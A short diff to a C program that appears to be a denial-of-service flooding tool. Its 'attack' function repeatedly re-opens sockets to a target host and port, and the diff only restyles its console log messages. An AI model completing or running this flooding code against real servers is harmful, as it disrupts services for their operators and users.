@@ -13,7 +13,7 @@
 int make_socket(char *host, char *port) {
 	struct addrinfo hints, *servinfo, *p;
 	int sock, r;
-//	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
+//	fprintf(stderr, "\033[92m[*] Connected ✓ %s : %s\n \033[0m", host, port);
 	memset(&hints, 0, sizeof(hints));
 	hints.ai_family = AF_UNSPEC;
 	hints.ai_socktype = SOCK_STREAM;
@@ -66,9 +66,9 @@ void attack(char *host, char *port, int id) {
 				sockets[x] = make_socket(host, port);
 			} else
 //				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
-			fprintf(stderr, "\033[92m[!] %i : Voly Sent\n \033[0m", id);
+			fprintf(stderr, "\033[92m[!] %i : Package Sent\n \033[0m", id);
 		}
-		fprintf(stderr, "\033[92m[!] %i : Voly Sent\n \033[0m", id);
+		fprintf(stderr, "\033[92m[!] %i : Package Sent\n \033[0m", id);
 		usleep(300000);
 	}
 }
